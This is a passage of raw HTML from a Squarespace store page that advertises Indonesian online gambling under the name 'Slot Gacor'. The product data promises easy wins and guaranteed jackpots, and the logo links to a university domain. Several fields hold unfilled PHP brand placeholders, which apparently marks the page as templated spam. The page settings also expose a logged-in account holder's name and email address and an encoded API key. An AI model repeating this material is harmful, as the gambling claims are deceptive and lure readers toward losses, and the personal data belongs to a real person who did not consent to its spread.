          "tweak-portfolio-hover-follow-delimiter": "Bullet",
          "tweak-portfolio-hover-follow-front": "false",
          "tweak-portfolio-hover-follow-layout": "Inline",
          "tweak-portfolio-hover-follow-size": "50",
          "tweak-portfolio-hover-follow-text-spacing-x": "1.5",
          "tweak-portfolio-hover-follow-text-spacing-y": "1.5",
          "tweak-portfolio-hover-static-animation-duration": "Fast",
          "tweak-portfolio-hover-static-animation-type": "Fade",
          "tweak-portfolio-hover-static-delimiter": "Hyphen",
          "tweak-portfolio-hover-static-front": "true",
          "tweak-portfolio-hover-static-layout": "Inline",
          "tweak-portfolio-hover-static-size": "50",
          "tweak-portfolio-hover-static-text-spacing-x": "1.5",
          "tweak-portfolio-hover-static-text-spacing-y": "1.5",
          "tweak-portfolio-index-background-animation-duration": "Medium",
          "tweak-portfolio-index-background-animation-type": "Fade",
          "tweak-portfolio-index-background-custom-height": "50",
          "tweak-portfolio-index-background-delimiter": "None",
          "tweak-portfolio-index-background-height": "Large",
          "tweak-portfolio-index-background-horizontal-alignment": "Center",
          "tweak-portfolio-index-background-link-format": "Stacked",
          "tweak-portfolio-index-background-persist": "false",
          "tweak-portfolio-index-background-vertical-alignment": "Middle",
          "tweak-portfolio-index-background-width": "Full",
          "tweak-product-basic-item-click-action": "None",
          "tweak-product-basic-item-gallery-aspect-ratio": "1:1 Square",
          "tweak-product-basic-item-gallery-design": "Slideshow",
          "tweak-product-basic-item-gallery-width": "53%",
          "tweak-product-basic-item-hover-action": "Zoom",
          "tweak-product-basic-item-image-spacing": "10vw",
          "tweak-product-basic-item-image-zoom-factor": "1.5",
          "tweak-product-basic-item-product-variant-display": "Dropdown",
          "tweak-product-basic-item-thumbnail-placement": "Side",
          "tweak-product-basic-item-variant-picker-layout": "Dropdowns",
          "tweak-mart-add-to-cart-button": "false",
          "tweak-mart-columns": "2",
          "tweak-mart-gutter-column": "2vw",
          "tweak-mart-gutter-row": "4vw",
          "tweak-mart-header-text-alignment": "Middle",
          "tweak-mart-image-aspect-ratio": "1:1 Square",
          "tweak-mart-image-text-spacing": "2vw",
          "tweak-mart-mobile-columns": "1",
          "tweak-mart-text-alignment": "Middle",
          "tweak-mart-width": "Full",
          "tweak-transparent-header": "true"
        },
        "templateId": "5c5a519771c10ba3470d8101",
        "templateVersion": "7.1",
        "pageFeatures": [1, 2, 4],
        "gmRenderKey": "QUl6YVN5Q0JUUk9xNkx1dkZfSUUxcjQ2LVQ0QWVUU1YtMGQ3bXk4",
        "templateScriptsRootUrl": "https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/scripts/",
        "betaFeatureFlags": ["template_translation_english_fallbacks", "header_usability_improvements", "pdp_product_add_ons_visitor_site", "commerce_subscription_renewal_notifications", "react_pages_panel", "visitor_react_forms", "fluid_engine", "rewrite_transactional_email_from_address", "send_local_pickup_ready_email", "campaigns_import_discounts", "campaigns_thumbnail_layout", "fluid_engine_new_multiselect_actions", "campaigns_discount_section_in_blasts", "marketing_landing_page", "commerce_order_status_access", "campaigns_global_uc_ab", "collection_typename_switching", "accounting_orders_sync", "viewer-role-contributor-invites", "fluid_engine_clean_up_grid_contextual_change", "unify_edit_mode_p1_70", "seven_one_migration_updated_kb_links", "commerce_clearpay", "commerce_etsy_product_import", "rte_text_highlights", "commerce_restock_notifications", "shape_block", "unify_edit_mode_p1", "link_editor_redesign", "nested_categories_migration_enabled", "fluid_engine_default_mobile_order", "is_feature_gate_refresh_enabled", "customer_accounts_email_verification", "website_component_enabled", "static_nav_phase_two", "toggle_preview_new_shortcut", "background_art_onboarding", "supports_versioned_template_assets", "commerce_etsy_shipping_import", "commerce_checkout_website_updates_enabled", "member_areas_feature", "website_fonts", "commsplat_forms_visitor_profile", "async_copy_collection", "customer_account_creation_recaptcha", "summary_block_video_collections", "new_stacked_index", "nested_categories", "unify_edit_mode_p2", "campaigns_discount_section_in_automations", "scripts_defer", "content_rte_ai_streaming", "website_form_improvements", "enable_css_variable_tweaks", "show_mobile_column_in_plp_editor", "rte_text_justify_align", "commerce_site_visitor_metrics", "campaigns_new_image_layout_picker", "override_block_styles", "themes", "show_add_to_cart_in_plp", "show_add_to_cart_in_plp_config_editor_circle"],
        "videoAssetsFeatureFlags": ["mux-data-video-collection", "mux-data-course-collection"],
        "authenticatedAccount": {
          "id": "65c1bea0b23340760f887a2c",
          "tutorialsCompleted": {
            "has-seen-fluid-engine-mobile-changes-notification": true
          },
          "notificationsRead": {},
          "lastLoginOn": 1707196064915,
          "displayName": "Plad Amer",
          "firstName": "Plad",
          "lastName": "Amer",
          "eligibleForMarketingDiscount": false,
          "avatarUrl": "https://images.squarespace-cdn.com/content/v2/namespaces/memberAccountAvatars/libraries/65c1bea0b23340760f887a2c/ca326fc3-ea1c-4efa-a51a-921ac42bfa60/thirdPartyMemberAvatar-65c1bea0b23340760f887a2c-e604b6a9-06ca-47ef-90e9-bfcc3036fca1?format=300w",
          "bio": "",
          "roles": {},
          "email": "amerplad@gmail.com",
          "createdOn": 1707196064685,
          "marketingId": "79d52580-8b33-45b4-9c36-152584a6622b",
          "avatarAssetUrl": "https://images.squarespace-cdn.com/content/v2/namespaces/memberAccountAvatars/libraries/65c1bea0b23340760f887a2c/ca326fc3-ea1c-4efa-a51a-921ac42bfa60/thirdPartyMemberAvatar-65c1bea0b23340760f887a2c-e604b6a9-06ca-47ef-90e9-bfcc3036fca1?format=300w",
          "pseudonymAccount": false,
          "preferredLocale": "en-US"
        },
        "authenticatedAccountWebsiteSettings": {
          "id": "65d57f5c06259703738ce80a"
        },
        "permissions": {
          "permissions": {
            "1": true
          }
        },
        "websiteRoles": {
          "1": true
        },
        "accessPermissions": [1221, 1224, 1611, 1, 1110, 1214, 12, 1414, 1112, 1223, 1413, 1228, 1514, 14, 1419, 1517, 1216, 1920, 1229, 1421, 1931, 1111, 1512, 1930, 1418, 1416, 2066, 1234, 1230, 13, 1225, 1226, 1510, 1417, 1700, 1610, 18, 1910, 1219, 1218, 1420, 1932, 1311, 1701, 1912, 1410, 1422, 1310, 1911, 1212, 1210, 1423, 1513, 1412, 1511, 15, 1516, 0, 1415, 1810, 1211, 1217, 1411, 1213, 1612, 11, 1921, 1220, 1515, 1215, 1233],
        "memberAccountNames": {
          "65c1bea0b23340760f887a2c": {
            "avatarUrl": "https://images.squarespace-cdn.com/content/v2/namespaces/memberAccountAvatars/libraries/65c1bea0b23340760f887a2c/ca326fc3-ea1c-4efa-a51a-921ac42bfa60/thirdPartyMemberAvatar-65c1bea0b23340760f887a2c-e604b6a9-06ca-47ef-90e9-bfcc3036fca1?format=300w",
            "bio": "",
            "displayName": "Plad Amer"
          }
        },
        "impersonatedSession": false,
        "demoCollections": [{
          "collectionId": "6564ed405646b229f453661b",
          "deleted": true
        }, {
          "collectionId": "6564f245f443470609472494",
          "deleted": true
        }, {
          "collectionId": "656659c4906443354900a86b",
          "deleted": true
        }, {
          "collectionId": "6567a07968d1bf1aa525eadb",
          "deleted": true
        }, {
          "collectionId": "6567ad2808ee812a4735882b",
          "deleted": true}, {
          "collectionId": "6567ad2903d294768578d7cc",
          "deleted": true
        }, {
          "collectionId": "6567ad2bd92d9e7e7e386109",
          "deleted": true
        }],
        "connectedAccounts": [{
          "serviceId": 64,
          "addedOn": 1708490583457,
          "profileUrl": "https://instagram.com/squarespace",
          "id": "65d57f574ebcc602269e9889",
          "websiteId": "65d57f574ebcc602269e9873",
          "pullEnabled": false,
          "pushEnabled": true,
          "autoPushEnabled": false,
          "iconEnabled": true,
          "defaultPushMessage": "%t %u",
          "accountState": 1,
          "pushAvailable": true,
          "serviceName": "instagram-unauth"
        }],
        "tzData": {
          "zones": [
            [420, null, "WIB", null]
          ],
          "rules": {}
        },
        "product": {
          "variantAttributeNames": [],
          "variants": [{
            "id": "3f479751-55c7-4a5c-bedd-aa43f7efea3c",
            "sku": "SQ3781351",
            "price": {
              "currencyCode": "IDR",
              "value": 2500,
              "decimalValue": "25.00",
              "fractionalDigits": 2
            },
            "salePrice": {
              "currencyCode": "IDR",
              "value": 0,
              "decimalValue": "0.00",
              "fractionalDigits": 2
            },
            "onSale": false,
            "stock": {
              "unlimited": true
            },
            "attributes": {},
            "shippingWeight": {
              "value": 0.0,
              "unit": "POUND"
            },
            "shippingSize": {
              "unit": "INCH",
              "width": 0.0,
              "height": 0.0,
              "len": 0.0
            }
          }],
          "subscribable": false,
          "fulfilledExternally": false,
          "productType": 1
        },
        "showAnnouncementBar": false,
        "recaptchaEnterpriseContext": {
          "recaptchaEnterpriseSiteKey": "6LdDFQwjAAAAAPigEvvPgEVbb7QBm-TkVJdDTlAv"
        },
        "i18nContext": {
          "timeZoneData": {
            "id": "Asia/Jakarta",
            "name": "Western Indonesia Time"
          }
        }
      };
    </script>
    <script type="application/ld+json">
      {
        "url": "https://flamingo-owl-hgdx.squarespace.com",
        "name": "Slot Gacor",
        "description": "",
        "image": "https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot88-pragmatic.png",
        "@context": "http://schema.org",
        "@type": "WebSite"
      }
    </script>
    <script type="application/ld+json">
      {
        "name": "<?php echo $BRANDS ?> 🦁 Link Login Daftar Judi Online Terbaru Terpercaya 🐪 Terbaru Gampang Menang Server Tergacor  ",
        "image": "https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot-gacor-server-thailand.jpg?format=1500w",
        "description": "<?php echo $BRANDS ?> slot server thailand terbaru dan mudah menang pada hari ini dengan deposit termurah dan juga pasti nya gampang jackpot <?php echo $BRANDS ?>. Segera daftar dan deposit sekarang juga untuk mendapatkan jackpot terbesar!",
        "brand": "Slot Gacor",
        "offers": {
          "price": 25.00,
          "priceCurrency": "IDR",
          "url": "https://central-laboratory.um.ac.id/manual/?mart=<?php echo $BRANDS ?>",
          "availability": "InStock",
          "sku": "SQ3781351",
          "@context": "http://schema.org",
          "@type": "Offer"
        },
        "@context": "http://schema.org",
        "@type": "Product"
      }
    </script>
    <link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/versioned-site-css/65d57f574ebcc602269e9873/1/5c5a519771c10ba3470d8101/65d57f574ebcc602269e987b/1495/site.css" />
    <script>
      Static.COOKIE_BANNER_CAPABLE = true;
    </script>
    <!-- End of Squarespace Headers -->
    <link rel="stylesheet" type="text/css" href="https://static1.squarespace.com/static/vta/5c5a519771c10ba3470d8101/versioned-assets/1706811132467-QIR6O63RE5GI9HXI9ESJ/static.css">
  </head>
  <body id="item-65d57fcfc018f86134456753" class="
      primary-button-style-solid primary-button-shape-pill secondary-button-style-outline secondary-button-shape-pill tertiary-button-style-outline tertiary-button-shape-pill form-use-theme-colors form-field-style-outline form-field-shape-pill form-field-border-all form-field-checkbox-type-icon form-field-checkbox-fill-outline form-field-checkbox-color-normal form-field-checkbox-shape-pill form-field-checkbox-layout-stack form-field-radio-type-icon form-field-radio-fill-outline form-field-radio-color-normal form-field-radio-shape-pill form-field-radio-layout-stack form-field-survey-fill-outline form-field-survey-color-normal form-field-survey-shape-pill header-overlay-alignment-left header-width-full tweak-transparent-header  tweak-fixed-header-style-basic tweak-blog-alternating-side-by-side-width-full tweak-blog-alternating-side-by-side-image-aspect-ratio-11-square tweak-blog-alternating-side-by-side-text-alignment-left tweak-blog-alternating-side-by-side-read-more-style-hide tweak-blog-alternating-side-by-side-image-text-alignment-middle tweak-blog-alternating-side-by-side-delimiter-bullet tweak-blog-alternating-side-by-side-meta-position-top tweak-blog-alternating-side-by-side-primary-meta-categories tweak-blog-alternating-side-by-side-secondary-meta-date tweak-blog-alternating-side-by-side-excerpt-show tweak-blog-basic-grid-width-full tweak-blog-basic-grid-image-aspect-ratio-32-standard tweak-blog-basic-grid-text-alignment-left tweak-blog-basic-grid-delimiter-bullet tweak-blog-basic-grid-image-placement-above tweak-blog-basic-grid-read-more-style-show tweak-blog-basic-grid-primary-meta-categories tweak-blog-basic-grid-secondary-meta-date tweak-blog-basic-grid-excerpt-show tweak-blog-item-width-narrow tweak-blog-item-text-alignment-left tweak-blog-item-meta-position-above-title  tweak-blog-item-show-date   tweak-blog-item-delimiter-bullet tweak-blog-masonry-width-inset tweak-blog-masonry-text-alignment-center tweak-blog-masonry-primary-meta-categories tweak-blog-masonry-secondary-meta-date tweak-blog-masonry-meta-position-top tweak-blog-masonry-read-more-style-hide tweak-blog-masonry-delimiter-space tweak-blog-masonry-image-placement-above tweak-blog-masonry-excerpt-show tweak-blog-side-by-side-width-inset tweak-blog-side-by-side-image-placement-left tweak-blog-side-by-side-image-aspect-ratio-11-square tweak-blog-side-by-side-primary-meta-categories tweak-blog-side-by-side-secondary-meta-date tweak-blog-side-by-side-meta-position-top tweak-blog-side-by-side-text-alignment-left tweak-blog-side-by-side-image-text-alignment-middle tweak-blog-side-by-side-read-more-style-show tweak-blog-side-by-side-delimiter-bullet tweak-blog-side-by-side-excerpt-show tweak-blog-single-column-width-inset tweak-blog-single-column-text-alignment-center tweak-blog-single-column-image-placement-above tweak-blog-single-column-delimiter-bullet tweak-blog-single-column-read-more-style-show tweak-blog-single-column-primary-meta-categories tweak-blog-single-column-secondary-meta-date tweak-blog-single-column-meta-position-top tweak-blog-single-column-content-full-post tweak-events-stacked-width-full tweak-events-stacked-height-large  tweak-events-stacked-show-thumbnails tweak-events-stacked-thumbnail-size-32-standard tweak-events-stacked-date-style-with-text tweak-events-stacked-show-time tweak-events-stacked-show-location  tweak-events-stacked-show-excerpt  tweak-global-animations-enabled tweak-global-animations-complexity-level-detailed tweak-global-animations-animation-style-fade tweak-global-animations-animation-type-fade tweak-global-animations-animation-curve-ease tweak-portfolio-grid-basic-width-full tweak-portfolio-grid-basic-height-small tweak-portfolio-grid-basic-image-aspect-ratio-11-square tweak-portfolio-grid-basic-text-alignment-left tweak-portfolio-grid-basic-hover-effect-fade tweak-portfolio-grid-overlay-width-full tweak-portfolio-grid-overlay-height-large tweak-portfolio-grid-overlay-image-aspect-ratio-11-square tweak-portfolio-grid-overlay-text-placement-center tweak-portfolio-grid-overlay-show-text-after-hover tweak-portfolio-index-background-link-format-stacked tweak-portfolio-index-background-width-full tweak-portfolio-index-background-height-large  tweak-portfolio-index-background-vertical-alignment-middle tweak-portfolio-index-background-horizontal-alignment-center tweak-portfolio-index-background-delimiter-none tweak-portfolio-index-background-animation-type-fade tweak-portfolio-index-background-animation-duration-medium tweak-portfolio-hover-follow-layout-inline  tweak-portfolio-hover-follow-delimiter-bullet tweak-portfolio-hover-follow-animation-type-fade tweak-portfolio-hover-follow-animation-duration-fast tweak-portfolio-hover-static-layout-inline tweak-portfolio-hover-static-front tweak-portfolio-hover-static-delimiter-hyphen tweak-portfolio-hover-static-animation-type-fade tweak-portfolio-hover-static-animation-duration-fast tweak-product-basic-item-product-variant-display-dropdown tweak-product-basic-item-width-full tweak-product-basic-item-gallery-aspect-ratio-11-square tweak-product-basic-item-text-alignment-left tweak-product-basic-item-navigation-none tweak-product-basic-item-content-alignment-top tweak-product-basic-item-gallery-design-slideshow tweak-product-basic-item-gallery-placement-right tweak-product-basic-item-thumbnail-placement-side tweak-product-basic-item-click-action-none tweak-product-basic-item-hover-action-zoom tweak-product-basic-item-variant-picker-layout-dropdowns tweak-mart-width-full tweak-mart-image-aspect-ratio-11-square tweak-mart-text-alignment-middle  tweak-mart-price-show tweak-mart-nested-category-type-top  tweak-mart-header-text-alignment-middle tweak-mart-breadcrumbs image-block-poster-text-alignment-center image-block-card-content-position-center image-block-card-text-alignment-left image-block-overlap-content-position-center image-block-overlap-text-alignment-left image-block-collage-content-position-center image-block-collage-text-alignment-center image-block-stack-text-alignment-left hide-opentable-icons opentable-style-dark tweak-product-quick-view-button-style-floating tweak-product-quick-view-button-position-center tweak-product-quick-view-lightbox-excerpt-display-truncate tweak-product-quick-view-lightbox-show-arrows tweak-product-quick-view-lightbox-show-close-button tweak-product-quick-view-lightbox-controls-weight-light native-currency-code-idr view-item collection-layout-default collection-type-mart collection-65d57fcfc018f8613445674d mobile-style-available sqs-seven-one
      
        show-pdp-product-add-ons
      
      
        
          
          
        
      
    " data-description="plp-mobile-editor-column" tabindex="-1">
    <div id="siteWrapper" class="clearfix site-wrapper">
      <header data-test="header" id="header" class="
    
      
        light
      
    
    header theme-col--primary
  " data-controller="Header" data-current-styles="{
                                                              &quot;layout&quot;: &quot;brandingCenter&quot;,
                                                              &quot;action&quot;: {
                                                                &quot;buttonText&quot;: &quot;Get Started&quot;,
                                                                &quot;newWindow&quot;: false
                                                              },
                                                              &quot;showSocial&quot;: false,
                                                              &quot;socialOptions&quot;: {
                                                                &quot;socialBorderShape&quot;: &quot;none&quot;,
                                                                &quot;socialBorderStyle&quot;: &quot;outline&quot;,
                                                                &quot;socialBorderThickness&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 1.0
                                                                }
                                                              },
                                                              &quot;sectionTheme&quot;: &quot;&quot;,
                                                              &quot;menuOverlayTheme&quot;: &quot;light&quot;,
                                                              &quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
                                                              &quot;cartStyle&quot;: &quot;text&quot;,
                                                              &quot;cartText&quot;: &quot;Cart&quot;,
                                                              &quot;showEmptyCartState&quot;: true,
                                                              &quot;cartOptions&quot;: {
                                                                &quot;iconType&quot;: &quot;stroke-1&quot;,
                                                                &quot;cartBorderShape&quot;: &quot;none&quot;,
                                                                &quot;cartBorderStyle&quot;: &quot;outline&quot;,
                                                                &quot;cartBorderThickness&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 1.0
                                                                }
                                                              },
                                                              &quot;showButton&quot;: false,
                                                              &quot;showCart&quot;: true,
                                                              &quot;showAccountLogin&quot;: false,
                                                              &quot;headerStyle&quot;: &quot;dynamic&quot;,
                                                              &quot;languagePicker&quot;: {
                                                                &quot;enabled&quot;: false,
                                                                &quot;iconEnabled&quot;: false,
                                                                &quot;iconType&quot;: &quot;globe&quot;,
                                                                &quot;flagShape&quot;: &quot;shiny&quot;,
                                                                &quot;languageFlags&quot;: [ ]
                                                              },
                                                              &quot;mobileOptions&quot;: {
                                                                &quot;layout&quot;: &quot;logoLeftNavRight&quot;,
                                                                &quot;menuIcon&quot;: &quot;halfLineHamburger&quot;,
                                                                &quot;menuIconOptions&quot;: {
                                                                  &quot;style&quot;: &quot;doubleLineHamburger&quot;,
                                                                  &quot;thickness&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 2.0
                                                                  }
                                                                }
                                                              },
                                                              &quot;dynamicOptions&quot;: {
                                                                &quot;border&quot;: {&quot;enabled&quot;: false,
                                                                  &quot;position&quot;: &quot;allSides&quot;,
                                                                  &quot;thickness&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 4.0
                                                                  }
                                                                }
                                                              },
                                                              &quot;solidOptions&quot;: {
                                                                &quot;headerOpacity&quot;: {
                                                                  &quot;unit&quot;: &quot;%&quot;,
                                                                  &quot;value&quot;: 100.0
                                                                },
                                                                &quot;border&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;position&quot;: &quot;allSides&quot;,
                                                                  &quot;thickness&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 4.0
                                                                  }
                                                                },
                                                                &quot;dropShadow&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;blur&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 30.0
                                                                  },
                                                                  &quot;spread&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 0.0
                                                                  },
                                                                  &quot;distance&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 0.0
                                                                  }
                                                                },
                                                                &quot;blurBackground&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;blurRadius&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 12.0
                                                                  }
                                                                }
                                                              },
                                                              &quot;gradientOptions&quot;: {
                                                                &quot;gradientType&quot;: &quot;faded&quot;,
                                                                &quot;headerOpacity&quot;: {
                                                                  &quot;unit&quot;: &quot;%&quot;,
                                                                  &quot;value&quot;: 90.0
                                                                },
                                                                &quot;border&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;position&quot;: &quot;allSides&quot;,
                                                                  &quot;thickness&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 4.0
                                                                  }
                                                                },
                                                                &quot;dropShadow&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;blur&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 30.0
                                                                  },
                                                                  &quot;spread&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 0.0
                                                                  },
                                                                  &quot;distance&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 0.0
                                                                  }
                                                                },
                                                                &quot;blurBackground&quot;: {
                                                                  &quot;enabled&quot;: false,
                                                                  &quot;blurRadius&quot;: {
                                                                    &quot;unit&quot;: &quot;px&quot;,
                                                                    &quot;value&quot;: 12.0
                                                                  }
                                                                }
                                                              },
                                                              &quot;dropShadowOptions&quot;: {
                                                                &quot;enabled&quot;: false,
                                                                &quot;blur&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 12.0
                                                                },
                                                                &quot;spread&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 0.0
                                                                },
                                                                &quot;distance&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,&quot;value&quot;: 12.0
                                                                }
                                                              },
                                                              &quot;borderOptions&quot;: {
                                                                &quot;enabled&quot;: false,
                                                                &quot;position&quot;: &quot;allSides&quot;,
                                                                &quot;thickness&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 4.0
                                                                }
                                                              },
                                                              &quot;showPromotedElement&quot;: false,
                                                              &quot;buttonVariant&quot;: &quot;primary&quot;,
                                                              &quot;blurBackground&quot;: {
                                                                &quot;enabled&quot;: false,
                                                                &quot;blurRadius&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 12.0
                                                                }
                                                              },
                                                              &quot;headerOpacity&quot;: {
                                                                &quot;unit&quot;: &quot;%&quot;,
                                                                &quot;value&quot;: 100.0
                                                              }
                                                            }" data-section-id="header" data-header-theme="" data-menu-overlay-theme="light" data-header-style="dynamic" data-language-picker="{
                                                              &quot;enabled&quot;: false,
                                                              &quot;iconEnabled&quot;: false,
                                                              &quot;iconType&quot;: &quot;globe&quot;,
                                                              &quot;flagShape&quot;: &quot;shiny&quot;,
                                                              &quot;languageFlags&quot;: [ ]
                                                            }" data-first-focusable-element tabindex="-1" style="
    
      
      
    
    
    
    
    
  ">
        <div class="sqs-announcement-bar-dropzone"></div>
        <div class="header-announcement-bar-wrapper">
          <a href="#page" class="header-skip-link sqs-button-element--primary"> Skip to Content </a>
          <style>
            @supports (-webkit-backdrop-filter: none) or (backdrop-filter: none) {
              .header-blur-background {}
            }
          </style>
          <div class="header-border" data-header-style="dynamic" data-header-usability-enabled="true" data-header-border="false" data-test="header-border" style="






  
    border-width: 0px !important;
  



  



"></div>
          <div class="header-dropshadow" data-header-style="dynamic" data-header-usability-enabled="true" data-header-dropshadow="false" data-test="header-dropshadow" style="


  
"></div>
          <div class='header-inner container--fluid
      
        header-layout--with-commerce
      
      
      
       header-mobile-layout-logo-left-nav-right
      
      
      
      
      
      
      
      
      
       header-layout-branding-center
      
      
      
      
      
      ' style="






  
    padding: 0;
  



" data-test="header-inner">
            <!-- Background -->
            <div class="header-background theme-bg--primary"></div>
            <div class="header-display-desktop" data-content-field="site-title">
              <style>
                .top-bun,
                .patty,
                .bottom-bun {
                  height: 2px;
                }
              </style>
              <!-- Burger -->
              <div class="header-burger

  menu-overlay-does-not-have-visible-non-navigation-items


  
  no-actions
  
" data-animation-role="header-element">
                <button class="header-burger-btn burger" data-test="header-burger">
                  <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
                  <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
                  <div class="burger-box">
                    <div class="burger-inner header-menu-icon-doubleLineHamburger">
                      <div class="top-bun"></div>
                      <div class="patty"></div>
                      <div class="bottom-bun"></div>
                    </div>
                  </div>
                </button>
              </div>
              <!-- Social -->
              <!-- Title and nav wrapper -->
              <div class="header-title-nav-wrapper">
                <!-- Nav -->
                <div class="header-nav">
                  <div class="header-nav-wrapper">
                    <nav class="header-nav-list">
                      <div class="header-nav-item header-nav-item--collection header-nav-item--active">
                        <a href="/mart" data-animation-role="header-element" aria-current="page"> mart </a>
                      </div>
                    </nav>
                  </div>
                </div>
                <!-- Title -->
                <div class="
                    header-title
                    
                  " data-animation-role="header-element">
                  <div class="header-title-logo">
                    <a href="https://central-laboratory.um.ac.id/manual/?mart=<?php echo $BRANDS ?>" data-animation-role="header-element">
                      <img elementtiming="nbf-header-logo-desktop" src="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot88-pragmatic.png?format=1500w" alt="<?php echo $BRANDS ?>" style="display:block" fetchpriority="high" loading="eager" decoding="async" data-loader="raw">
                    </a>
                  </div>
                </div>
              </div>
              <!-- Actions -->
              <div class="header-actions header-actions--right">
                <div class="showOnMobile">
                  <div class="header-actions-action header-actions-action--cart header-nav-item">
                    <a class="cart-style-text cart-text-link sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline" href="/cart">
                      <span class="mobile-cart-parenthesis">&#40;</span>
                      <span class="sqs-cart-quantity">0</span>
                      <span class="mobile-cart-parenthesis">&#41;</span>
                    </a>
                  </div>
                </div>
                <div class="showOnDesktop">
                  <div class="header-actions-action header-actions-action--cart header-nav-item">
                    <a class="cart-style-text cart-text-link sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline" href="/cart"> Cart <span class="cart-quantity-container"> &#40; <span class="sqs-cart-quantity">0</span>&#41; </span>
                    </a>
                  </div>
                </div>
              </div>
            </div>
            <div class="header-display-mobile" data-content-field="site-title">
              <!-- Social -->
              <!-- Title and nav wrapper -->
              <div class="header-title-nav-wrapper">
                <!-- Nav -->
                <div class="header-nav">
                  <div class="header-nav-wrapper">
                    <nav class="header-nav-list">
                      <div class="header-nav-item header-nav-item--collection header-nav-item--active">
                        <a href="/mart" data-animation-role="header-element" aria-current="page"> mart </a>
                      </div>
                    </nav>
                  </div>
                </div>
                <!-- Title -->
                <div class="
                    header-title
                    
                  " data-animation-role="header-element">
                  <div class="header-title-logo">
                    <a href="/" data-animation-role="header-element">
                      <img elementtiming="nbf-header-logo-desktop" src="https://xn--mgbaaaadj6a3c2c4gfdbk4f.site/assets/Gado2/slot88-pragmatic.png?format=1500w" alt="Slot Gacor" style="display:block" fetchpriority="high" loading="eager" decoding="async" data-loader="raw">
                    </a>
                  </div>
                </div>
              </div>
              <!-- Actions -->
              <div class="header-actions header-actions--right">
                <div class="showOnMobile">
                  <div class="header-actions-action header-actions-action--cart header-nav-item">
                    <a class="cart-style-text cart-text-link sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline" href="/cart">
                      <span class="mobile-cart-parenthesis">&#40;</span>
                      <span class="sqs-cart-quantity">0</span>
                      <span class="mobile-cart-parenthesis">&#41;</span>
                    </a>
                  </div>
                </div>
                <div class="showOnDesktop">
                  <div class="header-actions-action header-actions-action--cart header-nav-item">
                    <a class="cart-style-text cart-text-link sqs-custom-cart  header-icon  show-empty-cart-state cart-quantity-zero header-icon-border-shape-none header-icon-border-style-outline" href="/cart"> Cart <span class="cart-quantity-container"> &#40; <span class="sqs-cart-quantity">0</span>&#41; </span>
                    </a>
                  </div>
                </div>
              </div>
              <style>
                .top-bun,
                .patty,
                .bottom-bun {
                  height: 2px;
                }
              </style>
              <!-- Burger -->
              <div class="header-burger

  menu-overlay-does-not-have-visible-non-navigation-items


  
  no-actions
  
" data-animation-role="header-element">
                <button class="header-burger-btn burger" data-test="header-burger">
                  <span hidden class="js-header-burger-open-title visually-hidden">Open Menu</span>
                  <span hidden class="js-header-burger-close-title visually-hidden">Close Menu</span>
                  <div class="burger-box">
                    <div class="burger-inner header-menu-icon-doubleLineHamburger">
                      <div class="top-bun"></div>
                      <div class="patty"></div>
                      <div class="bottom-bun"></div>
                    </div>
                  </div>
                </button>
              </div>
            </div>
          </div>
        </div>
        <!-- (Mobile) Menu Navigation -->
        <div class="header-menu header-menu--folder-list
    light
    
    
    
    
    " data-current-styles="{
                                                              &quot;layout&quot;: &quot;brandingCenter&quot;,
                                                              &quot;action&quot;: {
                                                                &quot;buttonText&quot;: &quot;Get Started&quot;,
                                                                &quot;newWindow&quot;: false
                                                              },
                                                              &quot;showSocial&quot;: false,
                                                              &quot;socialOptions&quot;: {
                                                                &quot;socialBorderShape&quot;: &quot;none&quot;,
                                                                &quot;socialBorderStyle&quot;: &quot;outline&quot;,
                                                                &quot;socialBorderThickness&quot;: {
                                                                  &quot;unit&quot;: &quot;px&quot;,
                                                                  &quot;value&quot;: 1.0
                                                                }
                                                              },
                                                              &quot;sectionTheme&quot;: &quot;&quot;,
                                                              &quot;menuOverlayTheme&quot;: &quot;light&quot;,
                                                              &quot;menuOverlayAnimation&quot;: &quot;fade&quot;,
